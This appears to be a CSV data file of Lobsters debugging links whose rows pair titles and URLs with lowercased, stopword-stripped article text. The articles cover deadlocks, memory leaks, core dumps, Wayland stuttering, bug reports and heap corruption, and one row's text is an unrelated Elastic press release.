320,Lobsters,debugging,Debugging,Code that debugs itself: Fixing a deadlock with a watchdog,http://evanjones.ca/rare-deadlock-log-bug.html,code debugs fixing deadlock watchdog,bluecore engineering blog logging source code single lock python module import lock syscurrentframes watchdog timer google cloud task queue impacquirelock avoid circular import error log request circular buffer persevere brainstorm others tool need perfect fact make sense test assumption test program wrote report issue google,originally posted bluecore engineering blog rare hard reproduce bug worst recently fixed deadlock plagued code nearly year showed month would notice something stuck debug bit finally restart process problem would disappear eventually something changed started happening two three time day meant needed fix technique found cause adding thread constantly check deadlock report one found turn fairly easy process debug useful traditional tool working problem occured python web application running google app engine occasionally request seemed get logged started never completed eventually request would time get killed app engine suspected deadlock since locking bug common cause rare hang however stack trace printed request killed application expected deadlock stack consistent show thread waiting lock somewhere hint half trace python standard library logging module consistent pattern started reading python logging source code module single lock held formatting log entry seemed promising cause deadlock need cycle thread waiting theory two thread waiting shown figure figure thread call logging library hold logginglock time thread b lock lock named otherlock next thread try lock otherlock maybe call custom log formatter log writer wait thread b try log something need get logging lock cause cycle thread thread b wait forever deadlock unfortunately find anything logging code might grab another lock seemed like dead end hint many stack trace code executes first request new instance searching internet thing like startup revealed python module import lock issue deadlock code run import time try grab lock time seem relevant since see import stack trace starting get desperate brainstorming someone joked dump thread stack every second would need find right one million stack would record crazy impossible idea made u wonder could detect request stuck log thread stack precisely right moment general detecting deadlock correctly challenging need know thread waiting requires adding instrumentation lock implementation however need correct detected request seemed stuck long time say second could bug perfect thread waiting something making progress eg sleep incorrectly think deadlocked however miss deadlock long detect request timeout cancel request could implement added background thread dumped thread stack every second using syscurrentframes function compared current stack last stack captured thread appeared place suspicious logged state program sort constantly searching program bug tested manually causing deadlock put production unfortunately saw request getting stuck nothing log spent number hour retesting convincing getting triggered eventually realized possible problem deadlock logging library using log would cause watchdog also get stuck changed code write debugging output separate service google cloud task queue within hour deploying fix answer code stuck logging mysteriously request always stuck line code deep google app logging service bytesleft grouplengthstring numbytes make sense deadlock calling seems simple function math maybe stack trace inaccurate actually stuck somewhere near line eventually remembered module import lock fact stuck request usually happen startup happens call app engine logging code holding module import lock eg impacquirelock test program immediately hung line way reliably reproduce problem finally understood problem shown figure function import statement avoid circular import error statement usual place top file first time function called import executed hold import lock thread step code imported log anything try grab logging lock thread step time different thread call logging code acquires logging lock thread b step log handler attempt send log app engine logging service calling line code grouplengthstring function implemented native c library reason library try acquire import lock thread b step point deadlock since code trying acquire import lock native code library python instead see stuck function call explains code stuck line original stack trace request killed app engine reveal problem app engine kill one request deadlock request unblocked continues however likely also time get killed shortly printing stack anywhere confused debugging line code fact occur fairly frequently stuck trace dismissed possibly causing deadlock since obviously waiting anything one difficult bug fixed retrospect could saved lot time realized adding code debugs easy applicable deadlock example server crashing rare bad request log request circular buffer dump buffer crash however also learned lesson fix really hard bug persevere hint logging module import lock learned year investigating bug critical finding root cause brainstorm others suggestion log stack practical led eventual solution tool need perfect deadlock detector flawed good enough detect bug fact make sense test assumption starting second guess tool figure way verify telling right thing sometimes thing exactly bug end remember every bug computer system cause figure patience keep digging detail bug worked around see test program wrote report issue google
321,Lobsters,debugging,Debugging,Three kinds of memory leaks,https://blog.nelhage.com/post/three-kinds-of-leaks/,three kind memory leak,type unreachable allocation tell category leak type find leak asan valgrind tcmalloc heap tool take core dump stare really hard type unexpectedly longlived allocation particularly common tell category find leak guppy memoryprofiler objectspace type free unused unusable memory heap fragmentation tell category find leak tcmalloc jemalloc stripe,got program using time run probably immediately identify likely symptom memory leak say memory leak actually mean experience apparent memory leak divide three broad category somewhat different behavior requiring distinct tool approach debug post aim describe class provide tool technique figuring class dealing find leak type unreachable allocation classic cc memory leak someone allocated memory new malloc never called free delete release memory done void leakmemory char leaked malloc useabuffer leaked whoop forgot call free tell category writing c c especially c without ubiquitous use smart pointer manage memory lifetime first guess garbagecollected runtime possible nativecode extension leak type rule type first find leak use asan use asan use asan use another leak detector used valgrind tcmalloc heap tool tool environment allocator dump heap profile containing unfree allocation leaking enough time nearly active allocation come leak easy spot else fails take core dump stare really hard never first tool type unexpectedly longlived allocation leak leak classical sense memory still referred somewhere may even eventually freed program make far without running memory lot specific cause category common pattern look like unintentionally accumulating state onto global structure eg http server push every request object receives onto global list cache without appropriate expiry policy instance orm cache cache every object ever loaded active migration job load every record table capturing much state inside closure particularly common javscript unique environment broadly inadvertently holding every element array stream thought processing online streaming manner tell category writing garbagecollected runtime probably first guess compare heap size reported gc statistic memory size reported operating system leak category number comparable particular tend track time find leak use heap profiling dumping tool provided environment know guppy python memoryprofiler ruby scripted objectspace directly ruby type free unused unusable memory trickiest category characterize also important one understand aware class arises gap memory regarded free allocator inside vm runtime memory regarded free operating system heap fragmentation common cause one allocator flatout never return memory host operating system ever allocated see demo concept following short python program import sys guppy import hpy hp hpy def r return int open procselfstat read split def gcsize return hpheap size r gcsize buf bytearray range print start r gcsize format r gcsize buf buf print end r gcsize format r gcsize allocate buffer keep every one point print memory usage seen operating system r seen python gc laptop output look something like start end see python fact freed half buffer evidenced gcsize dropping nearly half peak managed return single byte operating system remaining memory available use python process process machine freebutunused segment may may pose problem python program go make bunch allocation space get reused fine setup made minimal allocation future allocation sized fit buffer left behind memory may remain unusable forever environment problem class particularly pronounced multiprocess server environment language like ruby python suppose setup server run n singlethreaded worker handle request concurrently let say concreteness normal usage worker us fairly steady amount memory let say concreteness low rate request arrive need much memory median request concreteness suppose minute receive request requires additional memory execution freed end request minute whale request arrive get assigned one worker probably random ideally worker allocate ram request release memory back o afterwards available future usage server whole need ram handle request pattern indefinitely however let imagine due heap fragmentation otherwise vm unable ever release memory operating system memory need o equal largest amount memory ever needed time particular process serf highmemory request process memory footprint bloated forever server launch see memory usage soon first large request hit one worker bloat drop back overall memory usage jump future request come sometimes land process served whale request memory usage unchanged sometimes also land new worker total memory usage grow another point worker served request least using total ram far ideal furthermore looking fleet usage time see slow rise look much like true leak tell category compare heap size reported allocator r reported operating system type problem number tend diverge time like make app server report number timeseries infrastructure periodically easy graphing linux get o view using field procselfstat allocator view languagevmspecific api find leak category mentioned bit trickier since often result component working designed said number useful trick mitigating reducing impact kind virtual leak restart process often problem grows slowly restarting app process every hour might make nonissue nearly every large ruby python shop talk end even aggressively teach worker selfrestart memory footprint cross threshold certain amount growth sure put thought ensuring entire fleet start spontaneously restarting sync use different allocator tcmalloc jemalloc tend much better fragmentation property time default allocator easy experiment using ldpreload dropin identify single request take far memory others stripe api server measure r servicing every api request log delta easy query log aggregation system identify specific endpoint user pattern responsible spiking memory tune gcallocator many gc allocator contain tunables control aggressively try return memory o much optimizes avoiding fragmentation useful parameter tricky area make sure know measuring optimizing start findconsult expert particular vm possible
322,Lobsters,debugging,Debugging,How to get a core dump for a segfault on Linux,https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/,get core dump segfault linux,segfault step run valgrind get core dump core dump ulimit set max size core dump maximum size core dump per process soft limit kernelcorepattern core dump written global man core kernelcorepattern ubuntu core dump getting backtrace gdb look stack every thread gdb core dump amazing asan getting stack trace core dump pretty approachable,week work spent week trying debug segfault never done basic thing involved get core dump find line number segfaulted took long time figure blog post explaining thing end blog post know go oh program segfaulting idea happening well know stack line number segfaulted least segfault segmentation fault program try access memory allowed access try caused trying dereference null pointer allowed access memory address trying dereference pointer memory c vtable pointer got corrupted pointing wrong place cause program try execute memory executable thing understand like think misaligned memory access also segfault c vtable pointer thing happening segfaulting program might explain future blog post know c beginning week vtable lookup thing new way program segfault know blog post c bug let talk basic like even get core dump step run valgrind found easiest way figure program segfaulting use valgrind ran valgrind v yourprogram gave stack trace happened neat also wanted indepth investigation find valgrind telling wanted get core dump explore get core dump core dump copy program memory useful trying debug went wrong problematic program program segfaults linux kernel sometimes write core dump disk originally tried get core dump pretty frustrated long time linux writing core dump core dump ended run ulimit c unlimited starting program run sudo sysctl w kernelcorepatterntmpcore e p h ulimit set max size core dump ulimit c set maximum size core dump often set mean kernel write core dump kilobyte ulimits per process see process limit running cat procpidlimit example limit random firefox process system cat limit soft limit hard limit unit max cpu time unlimited unlimited second max file size unlimited unlimited byte max data size unlimited unlimited byte max stack size unlimited byte max core file size unlimited byte max resident set unlimited unlimited byte max process process max open file file max locked memory byte max address space unlimited unlimited byte max file lock unlimited unlimited lock max pending signal signal max msgqueue size byte max nice priority max realtime priority max realtime timeout unlimited unlimited u kernel us soft limit case max core file size deciding big core file write increase soft limit hard limit using ulimit shell builtin ulimit c unlimited kernelcorepattern core dump written kernelcorepattern kernel parameter sysctl setting control linux kernel writes core dump disk kernel parameter way set global setting system get list every kernel parameter running sysctl use sysctl kernelcorepattern look kernelcorepattern setting specifically sysctl w kernelcorepatterntmpcore e p h write core dump tmpcore bunch stuff identifying process want know e p parameter read see man core important know kernelcorepattern global setting good little careful changing possible system depend set certain way kernelcorepattern ubuntu default ubuntu system kernelcorepattern set sysctl kernelcorepattern kernelcorepattern usrshareapportapport p c p caused lot confusion apport thing core dump learned ubuntu us system called apport report crash apt package setting kernelcorepatternusrshareapportapport p c p mean core dump piped apport apport log varlogapportlog apport default ignore crash binary part ubuntu package ended overriding apport business setting kernelcorepattern sysctl w kernelcorepatterntmpcore e p h dev machine care whether apport working feel like trying convince apport give core dump core dump okay know ulimits kernelcorepattern actually core dump file disk tmp amazing still know program segfaulted next step open core file gdb get backtrace getting backtrace gdb open core file gdb like gdb c mycorefile next want know stack program crashed running bt gdb prompt give backtrace case gdb loaded symbol binary like luckily loading symbol fixed load debugging symbol symbolfile pathtomybinary sharedlibrary load symbol binary shared library binary us gdb gave beautiful stack trace line number ran bt want work binary compiled debugging symbol line number stack trace extremely helpful trying figure program crashed look stack every thread get stack every thread gdb thread apply bt full gdb core dump amazing core dump debugging symbol gdb amazing situation go call stack print variable poke around memory see happened best still working gdb wizard also print stack trace bt okay asan another path figuring segfault one compile program addresssanitizer asan cc fsanitizeaddress run going discus post already pretty long anyway case segfault disappeared asan turned reason possibly asan build used different memory allocator system malloc instead tcmalloc might write asan future ever get work getting stack trace core dump pretty approachable blog post sound like lot pretty confused really many step getting stack trace segfaulting program try valgrind work want core dump investigate make sure binary compiled debugging symbol set ulimit kernelcorepattern correctly run program open core dump gdb load symbol run bt try figure happened able using gdb figure c vtable entry pointing corrupt memory somewhat helpful helped feel like understood c bit better maybe talk use gdb figure thing another day
324,Lobsters,debugging,Debugging,An Introduction to Windows Kernel Debugging,https://www.endgame.com/blog/technical-blog/introduction-windows-kernel-debugging,introduction window kernel debugging,elastic endpoint security industryrecognized leader siem early access program av comparative independent antivirus test strongest source endpoint security data journey siem endpoint security elastic siem end endpoint pricing security leader comment elastic endpoint security texas university andrew stokes assistant director information security officer optiv anthony diaz divisional vice president emerging service infotrack sebastian mill chief technology officer global development sans institute john pescatore director emerging security trend early access program elastic endpoint security register resource elastic tour,today excited announce introduction elastic endpoint security based elastic acquisition endgame pioneer industryrecognized leader endpoint threat prevention detection response based mitre att matrix elastic combining siem endpoint security single solution enable organization automatically flexibly respond threat real time whether cloud onpremises hybrid environment also announced today elastic eliminating perendpoint pricing register elastic endpoint security early access program two key trend endpoint security importance strong analytics backend rise mitre att ck framework lingua franca help make case greater emphasis threat hunting incident response use case said fernando montenegro principal analyst research elastic acquisition endgame fit well within trend combination siem endpoint security enable organization pursue efficiency around use case endgame validated numerous independent testing organization including n lab se lab mitre others strongest prevention detection available recently illustrated performance av comparative independent antivirus test endgame demonstrated exceptional protection realworld threat preventing malware cloud connectivity required additionally elastic endpoint security brings one strongest source endpoint security data raw endpoint event data alert elastic stack joining existing logging security apm infrastructure event collection average threat dwell time exceeding day shipping scaling storing data efficiently elasticsearch make searching disparate securityrelated data practical easy fast accordingly endpoint security natural fit elastic stack provide prevention threat fastest detection response stop attack earliest stage possible user deserve tool deploy providing immediate value today simplicity single stack search store analyze secure data said shay banon founder chief executive officer elastic exciting step toward realizing vision applying search multiple use case able offer user best threat hunting solution best endpoint protection journey siem endpoint security tool working isolation safeguard organization data tool collect actionable without centralized management console security team faced siloed data slow query time compromised analysis lack relevance context organization already know need work real time need ingest store type data way unbounded need produce relevant result automatically operationalize existing new security workflow nearly two year ago embarked mission help organization evolve security effort elastic stack adopted used security solution use case like threat hunting fraud detection security monitoring wanted make even easier user deploy product security first worked collaboration community develop elastic common schema ec provide easy way normalize data disparate source network host data launched elastic siem world first free open siem stop deploy data collection agent elastic siem protect endpoint simultaneously remove inefficiency multiple solution respond time prevent damage loss stopping attack early possible goal requires best prevention highest fidelity detection endpoint combination endgame leading endpoint protection technology elastic siem creates interactive workspace secops threat hunting team stop attack protect organization said nate fick formerly ceo endgame general manager elastic security end endpoint pricing addition combining world first free open siem best endpoint protection technology elastic eliminating perendpoint pricing user need count number device need protect choose many day threat intelligence data afford retain added banon want organization best protection use everywhere penalized perendpoint pricing elastic customer pay resource capacity solution use elastic log apm siem app search site search enterprise search endpoint security consistent transparent pricing framework ensures organization capture maximum value data elastic endpoint security customer get full protection many endpoint need full data collection shipping without compromise security leader comment elastic endpoint security texas university andrew stokes assistant director information security officer value speed response ability learn analyze historical data elastic endpoint security dramatically dropped mean time remediate seven day minute legacy antivirus elastic stack provided unparalleled way store analyze react data well beyond competitor market combining elastic endpoint security elastic stack single intelligenceled platform simplify automate security operation optiv anthony diaz divisional vice president emerging service elastic bringing together integration nextgeneration siem robust visualization engine bestinclass endpoint product backed world leading search technology combination provides foundation enterprise combat growing complexity cyber threat elastic vision bringing together component open ecosystem revolutionary yet practical idea help organization size maximize data manage cyber security need infotrack sebastian mill chief technology officer global development infotrack come realize valuable endpoint data gaining visibility operation making sure infrastructure remains secure toward goal innovation team already scoping auditbeat environment introducing elastic endpoint security take whole new level intrigued ability stop threat elastic endpoint security pairing security event data elastic machine learningpowered anomaly detection killer setup sans institute john pescatore director emerging security trend sans surveyed soc manager tool wish new soc hire skilled elastic elk stack one top one mentioned component elk stack used soc analyst application developer strong edr capability integrated endpoint side standard package deployed devops cicd pipeline real game changer visibility detection prevention cyber attack early access program elastic endpoint securitywe working hard integrate endpoint siem offering interested joining early access program elastic endpoint security register resource want see elastic endpoint security action hear development please join u one elastic tour stop u emea asia pacific
327,Lobsters,debugging,Debugging,Leak Hunting and Mutter Hacking,https://feaneron.com/2018/03/30/leak-hunting-and-mutter-hacking/,leak hunting mutter hacking,animation comment written jonas ådahl bug mutter wayland mutter wayland app inspecting mutter wayland mutter env var control debugging issue fixed commit stuttering temporary fix memory leak link gitlab comment like published,greeting gnomers last week upgraded gnome sad notice extremely annoying bug muttergnome shell every microstuttering happened addition another bug disappointing quite tilingmaximizeunmaximize animation working wayland former may look like end world trust say splitsecond delay every perceived difference butter smooth trashy experience course free software free people habit fixing whatever bothering naturally decided fix decided document journey people want try muttergnome shell development le scared animation decided start working animation since comment written jonas ådahl bug leading clue whatever issue time open gnome builder clone mutter mutter wayland mutter wayland app testing change obviously needed run mutter see happening since talking wayland specifically interested seeing message sent application message mutter receiving dump wayland call made application use waylanddebug env var like application dump lot information terminal might might useful one obvious way test change mutter build install mutter systemwide reboot rebooting take almost minute clearly good approach mutter nested mode run inside another mutter session run nested mutter wayland session mutter change making mutter crash might want run gdb mutter built autotools course make every single thing complicated notice srcmutter executable wrapper script run mutter gdb libtool gdb mutter gdb open r open window new raw mutter session run graphical application new nested mutter long toolkit support wayland run application inspecting mutter wayland trickiest part mutter env var control debugging could use properly either would dump much info nothing useful decided go dumb way add dozen print around code aware better way please leave comment issue root issue function static void struct wlclient client struct wlresource resource x width height metawaylandsurface surface surfacefromxdgsurfaceresource resource surface pending hasnewgeometry true surface pending newgeometryx x surface pending newgeometryy surface pending newgeometrywidth width surface pending newgeometryheight height spot issue look notice mutter accepting whatever new geometry check new geometry differs current geometry change report anything compositor compositor gnome shell thing get even worse go j trampoline slow could avoided apparently gtk report geometry change even happen eg hovering whatever area window every single one hundred geometry change actually change per second would go though ipc mutter mindlessly jump compositor j trampoline nothing geometry actually changed fixed commit stuttering second point actually freaking mutter waking discrete gpu quite often prime system mean gpu put sleep second without used every wakeup would produce incredibly annoying stutter happening wayland investigation came temporary fix mutter becomes smarter handle gpus one already merged available next gnome release memory leak oh dear infamous memory leave link gitlab comment go figure like like loading published de march de de march de
328,Lobsters,debugging,Debugging,Why I usually run 'w' first when troubleshooting unknown machines,https://rachelbythebay.com/w/2018/03/26/w/,usually run w first troubleshooting unknown machine,usually run w first troubleshooting unknown machine,usually run w first troubleshooting unknown machine first command run upon jumping wayward linux box try troubleshoot something almost always w unless data pointing direction landing system like see sort first snapshot box go possibly thing bother well year discovered number bizarre thing odd little bit data returned command output mock output day user load average user tty login idle jcpu pcpu alice abcexamplecom binsh rachel xyzexamplecom w right see okay box nt rebooted recently busy minute ago nt busy right oh hey person box poking thing afternoon look like last something interactive minute ago nt time badness started next thing go get touch person would foolish continue answer might short chat message away sometimes get box one user board user running w nothing else many time gone looked part syslog capture login information might varlogsecure depending system setup found grepping accepted cert great way look prior ssh connection possibly interactive logins discarding bunch stuff relatively uninteresting obviously could also use last see box recently nt whole story totally possible ssh root box pathtocommand never start login shell leaf trace lastlog go break something box syslog find mention clear someone system interactive stuff go look shell history ideally timestamped way associate specific login session even raw command history back beginning time box better nothing able track wellmeaning ultimately flawed attempt fixing thing blew became something much bigger folk pinged amazed somehow managed guess specific member team poking specific box really magic guessing ssh log show cert identity andor source address bash log show ran rest academic would great already aggregated analyzed get kind warning hey box minute ago ran kind command root experience many place nt kind automation really nt care enough ever bother mean fall back oldschool first principle debug thing since clearer signal case clear wish nt ssh start poking box directly industry move running thing way sometimes resort tracking change way want impress set system company reimage box within hour someone logging root andor something privileged sudo local equivalent make stick keep randos leaving experiment box persist month year make thing unnecessarily interesting others road hey somehow automate thing nobody ever need ssh swing way ahead outfit know better ca nt manage make happen due sheer inertia make happen organization still relatively small much better may outage log filled helpful data
329,Lobsters,debugging,Debugging,Book review: Formalizing debugging,https://wozniak.ca/blog/2018/03/25/Book-review-Formalizing-debugging/index.html,book review formalizing debugging,book review formalizing debugging,book review formalizing debugging third series review debugging book science debugging matt telles yuan hsieh coriolis pp program fail guide systematic debugging edition andreas zeller morgan kaufmann pp given time effort collectively spent debugging software industry make sense explore notion formalizing practice involves reflecting process breaking constituent part complicate matter field study debugging cross empirical formal science artifact deal program complicatedly deterministic birthed social force maintained political realm human interaction debug vacuum technological process two book talk review take stab turning debugging activity based evidence formalism beyond worked wonderful program fail woeful science debugging start woeful studying science debugging slog one thing got lot text physical copy read typical textbook size surprisingly small margin lot text confronted wall mildly intimidating superficial nitpick though substantial problem editing one call constant distraction first seemingly minor issue ended serious distraction like using word intended thing make doubletake act reading start question editing mishap author misunderstanding something happens frequency book start checking source verify said also abundance meandering sentence felt like first draft long stretch grievous editing mistake though allowing story repeated ad nauseam reading book felt duped partaking lecturerant lost track many time said add printf bug go away solved anything much case magical printf mentioned would think epidemic want regular reminder race condition buffer problem digital tv system mean subject book forgivable though mention selfish reason hard contain much like science debugging core problem book fails make case defining debugging profession good part book many word bound get something right one survey infamous bug probably heard intel pentium fdiv ariane mar climate orbiter outage still good case study fact overview occurs beginning book made hopeful rest hope dashed started set something approaching science title discussing philosophy science much review safe say part science act classifying taxonomy often contentious practice general agreement similarity among group thing useful try categorize defect bug exception diagnosing correcting defect becomes easier gain experience solving recognizing similarity guide investigation telles hsieh examine idea discussing bug definition life cycle leading bug taxonomy fundamental aspect book try establish groundwork debugging profession taxonomy would provide knowledge base finding new entry refining definition would part science taxonomy start requirement design implementation process build deployment future planning documentation reasonable breakdown given roughly aligns phase software development immediately describes class making classic mistake overloading terminology confusing reader different muddying water fact consist almost entirely thing occur directly code seem fall class implementation bug thus completely ignoring seven class deeply unsatisfying narrative give author credit ambition execution really miss mark worse range covered bug class varies wildly overlap confounding way example one class lengthsizes remarkably narrow whereas another application error wide open resource error latter literally set subset former description constitutes allocation deallocation error say classic memory allocationdeallocation error subclass memory resource leak sure seems like relationship ignored mentioned earlier taxonomy contentious breakdown presented seems hastily concocted bordering careless come idea debugging profession admit skeptical willing listen argument end convinced mean bad argument put forth science debugging present though much argument struggled get treatise work beyond fact year hindsight industry knowledge draw since published taxonomy laid telles hsieh go great length debug different debugging technique situation postmortem analysis testing maintenance something called term seem coined describing decent design implementation decision discussion kind thing find reasonable software engineering book today even time organization may questionable aside one thing see usual advice greatest weakness lack concision truly hamper message description drag story repetitive distinct air pomposity war story end book make case debugging profession exasperating read hoping redemption left wanting turn profession debugging laid book know book end day life professional get flavour first entry imagined logbook arrive work check email look new problem report two new bug reported email one moderate severity low severity decide leave bit read remainder email followed similar description thing developer every day try reproduce bug find possible enhancement talk others issue attend meeting complete detail debugger quick crossword puzzle get glass water taste verbosity page ultimately think book fails author twisted take software engineering development life debugger life developer churn code reasonable team dynamic developer churn code testing left tester design left architect debugging left debugger get dangerously close siloed waterfall strawman used prop ego agile evangelist hard pressed find someone seriously advocate kind approach even time yet book seems put curtly bad two aspect science debugging must called first bug puzzle chapter end describes situation debugged illuminate idea add discussion reading solution appendix left wondering clue puzzle actually since solution far removed puzzle description come across arrogant showmanship pale comparison blatant provocation put forth talking defensive programming asserts evil opening paragraph section evil p lay described nuclear take surveying book article written debugging bug prevention one technique stood book article encouragement use asserts frankly see value asserts producing quality software fact believe usage asserts mark lazy programmer discussed chapter believe asserts increase odds bug formation introduction usage asserts avoided argument nutshell asserts removed production build situation occur development mean occur production problem equate assert usage error handling asserts error handling genuinely bad idea apparently author could envision usage asserts experienced approach even worse double claim evidence science book asserts actually produce bug actively bad advice derived anecdotal data science debugging first tech book let alone debugging book grated nerve much recommend way get information elsewhere probably presented better complete opposite end recommendation spectrum book acted blissful antidote comparing program fail science debugging unfair exercise one thing book laserfocussed zeller address single aspect formal debugging given reproduce scenario induce program failure determine defect caused failure technical essence debugging deftly avoids softer part process softer thing bug tracking ignored explored beyond necessary telles hsieh hand addressed much broader scope considerably le formality intent compare book contrasting quality best laid plan mouse men often go awry zeller book formalize process diagnosing fixing defect good software engineer seem intuit dub delta debugging algorithm one algorithm seems obvious read presentation explanation clear left wondering never thought time reach end although delta debugging make perfect sense often wondered zeller underappreciates effort could involved automating purpose formalization automate debugging process much possible includes implementation delta debugging complicated however one algorithm download use variety environmental factor come play attempt use undermine value ignore algorithm peril read imagined using daytoday work seem easy text suggesting side time automating probably overkill caveat though speak brilliance work automation necessary component genuinely useful book older tool used dated rely get point across aside basic also somewhat distracting practice using allcaps program name see lot even tool use though zeller consumate academic informs reader proceed caution tool may available anymore refereshing change book seem think url forever book also dedicates whole chapter usage asserts made entertaining contrast telles absymal advice argument convincing frame asserts automating observation importantly outline useful checking invariant pre post condition kind specification latter part book academic practical bent may find le engaging zeller warns reader idea fully evaluated nice touch discourage reading although heard tool implement idea outline important stuff program fail stellar book well organized clearly written illuminating thoughtful worth time attention useful many year come
330,Lobsters,debugging,Debugging,Craft Minimal Bug Reports,http://matthewrocklin.com/blog/work/2018/02/28/minimal-bug-reports,craft minimal bug report,supporting user open source minimal complete verifiable example minimal complete verifiable exmamples post data mydatacsvgz actually include data see small make thing remove unnecessary step use syntax highlighting provide complete tracebacks ask question public place panda community personal preference comment powered disqus blog comment powered,following post supporting user open source post list suggestion ask maintainer help problem follow suggestion optional make likely project maintainer spend time helping important remember willingness support free optional crafting minimal bug report essential life maintenance communitydriven open source project well incredible service community minimal complete verifiable example strongly recommend following stack overflow guideline minimal complete verifiable exmamples include brief highlight code minimal use little code possible still produce problem complete provide part needed reproduce problem verifiable test code provide make sure reproduces problem let clear hard take time questionasker find creating mcve often take minute simple problem fortunately work usually straightforward even know much package trouble work create minimal example removing code specific application questionasker probably qualified person answering question often point people stackoverflow mcve document sometimes come back betterbutnotyetminimal example post clarifies common issue running example going use panda dataframe problem post data post file working instead try see reproduce problem line data rather whole thing download file unzip etc make much le likely someone actually run example free time uploaded data dropbox get mydatacsvgz import panda pd df pdreadcsv mydatacsvgz able copypaste following get enough data cause problem import panda pd df pddataframe accountstart client alice anders bob baker charlie chaplin balance dbid proxyid rank actually include data actually data probably lot information specific application eye gloss maintainer know relevant take time digest include instead see reproduce failure artificial random data enough data reproduce problem import panda pd df pddataframe accountstart client alice anders bob baker charlie chaplin balance dbid proxyid rank actual problem finding best ranked employee certain time period reproduce problem simpler dataset notice date order data come found critical reproducing error import panda pd df pddataframe accountstart dbid name alice bob charlie shrink example problem often discover lot cause problem discovery valuable something questionasker capable efficiently see small make thing make even easier see small make data example working tabular data like panda many column actually need reproduce failure many row actually need reproduce failure column need named could b descriptive type within import panda pd df pddataframe datetime id remove unnecessary step every line example absolutely necessary reproduce error able delete line code please already understand problem much efficient maintainer probably know tool know code groupby step raising warning understand df pddataframe df df dfvalue df dffillna dfgroupby dfx ymean produce error groupby step raising warning understand df pddataframe dfgroupby dfx ymean produce error use syntax highlighting using github enclose code block triplebackticks character topleft keyboard usstandard qwerty keyboard look like provide complete tracebacks know stuff code exception hard make sense include get zerodivisionerror following code python def div x return x div get zerodivisionerror following code python def div x return x div pythontraceback zerodivisionerror traceback recent call last module div div x def div x return x zerodivisionerror division zero traceback long ok really want clean put detail bracket get zerodivisionerror following code python def div x return x div traceback detail python zerodivisionerror traceback recent call last module div div x def div x return x zerodivisionerror division zero detail ask question public place raising issue often possible location github issue tracker stack overflow project mailing list project chat room email maintainer directly never different project handle differently usually page documentation go help often labeled community support ask help recommendation panda community generally good ask question many maintainer see question help user find question answer encounter similar bug future goal may solve problem maintainer goal likely create record solve problem like help many user similar problem future see wellcrafted bug report learn resulting conversation personal preference user question like right way x prefer stack overflow bug report like x pretty confident work get error prefer github issue general chitchat prefer gitter though actually personally spend almost time gitter easily searchable future user asked question gitter almost certainly respond except direct github stack overflow blogpost like personal email someone proposing fund seriously support project way different project differently different policy check documentation project dealing learn like support user please enable javascript view comment powered disqus blog comment powered
331,Lobsters,debugging,Debugging,Things you might be interested in if you want start learning about the Pony programming language,https://gist.github.com/aturley/49b60c98306d90ffc2f981515827b005,thing might interested want start learning pony programming language,pony consideration pony programming language tweet editoride support build tool gradle plugin compilerruntime installation instruction debugging pony lldb cheatsheet ponylldb package management community zulip ponylang twitter account testing unit testing framework test option parser property based testing system project organization library project starter pony standard library style guide documentation standard library documentation learning pony tutorial,pony consideration thinking checking pony programming language list thing think important know list based tweet wrote editoride support pony package several popular editor currently support popular ides like eclipse intellij build tool pony compiler handle work building linking pony program anything complex needed common solution use makefile gradle plugin well compilerruntime pony program compiled native code using ponyc compiler based llvm recommended method installing pony supported system use ponyup installation instruction system debugging pony compiler create debug build program work lldb also work gdb le tested pony lldb cheatsheet set breakpoints inspect variable ponylldb extension make little easier inspect thing like string array package management corral recommended dependency manager replaces stable old dependency manager community pony community communicates primarily zulip also ponylang twitter account testing standard library ship unit testing framework look pretty familiar used unit testing framework lot unit test standard library package look example test option parser also property based testing system kind thing project organization pony compiler pretty flexible find thing package mapped directory file within directory contain number class use name end pony project called library project starter used set pony project basic file version control ci documentation pony standard library style guide includes recommendation file naming documentation pony support package classlevel doc string compiler use generate documentation standard library documentation us system learning main resource learning pony pony tutorial
333,Lobsters,debugging,Debugging,Learning from Code History (2009),https://www.youtube.com/watch?v=SzRqd4YeLlM,learning code history,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature learning code history youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature learning code history youtube
334,Lobsters,debugging,Debugging,Solving a Mysterious Heap Corruption Crash,https://topologyeyewear.github.io/engineering-blog/2018/03/07/heap_corruption/,solving mysterious heap corruption crash,app first let look heap corruption gathering signal crash reporting crashlytics try reproduce issue go back time challenge every assumption analyze slice code thread sanitizer interlude bruteforce search remove thirdparty code ssziparchive move suspicious piece empty project get stuck choose new angle aftermath workaround file radar karoly lorentey submitted fix confirm version app used crash crash built new xcode beta actual problem alignment alignment address sanitizer lesson learned vasarhelyia,back noticed increase crash app crash marked heap corruption make hard debug location given stack trace far away code time problem actually lie long investigation many path turned issue swift sharing tweet twitter lot people asking detail sharing story mighty heap corruption issue ready tale woe frustration ultimately redemption curious io team case investigate track bug read first let look heap corruption isheap corruption occurs dynamic allocation memory handled properly typical heap corruption problem reading writing outside bound allocated memory doublefreeing memory since result eg hard crash happen later program try manipulate incorrectly allocated piece memory root cause issue remain hidden eye gathering signal crash reportingit started report crashlytics increasing number heap corruption issue content issue helpful crash little relation real problem number issue started increasing started getting nervous crashfree user session went almost month increase crash lined crashlytics sdk update started asking anything might changed end perhaps improved issue tracking maybe enabled something sends u exception thrown system library quick respond answer definitive problem indeed problem nothing change crashlytics try reproduce issueby looking device type realized crash io older device iphone plus se latest ipod touch ipad mini unfortunately older test device office io probably tested app io device ever lining crash analytics event looked like app crashed people opened try view ar view try topology glass seemed reasonable screen heavy one full scene kit metal allocating significantly memory part app able reproduce crash great first step could start investigating part code problem go back timethe classic way track source bug bisect try version app last month see crash try another one either eventually enough try narrow exact commit found version app eight month ago io introduced ran affected io device still crashed eight month old app fine running io io conclusion something changed io trigger crash working hypothesis io us memory io increased memory pressure cause app crash older device challenge every assumptionthe team suggestion validate hypothesis run app io iphone get crash memory pressure issue could malloc big chunk memory enter try view crash hypothesis incorrect least scratched strong possibility analyze slice codeat point tried think problem could happen first place knew something app mishandled memory way corrupted heap swift mostly memory safe unless something exotic safe however exotic code examine issue incorrect pointer manipulation like double freeing reviewed code raw pointer handling c code lowlevel graphic code good candidate incorrect pointer usage turned fine thread data race great tool called thread sanitizer built xcode help find data race issue app unfortunately run simulator much app us feature unsupported part run simulator worked fine trigger thread sanitizer warning manually tracked every piece concurrent code app marking safe inspected turned safe interlude bug io eric ceo blaming platform system framework easy unlikely occurrence smiled ceo saying think knowing yet close truth even immediately jumped conclusion swift bug still needed find reproducible case file bug report bruteforce search doubt use brute force ken 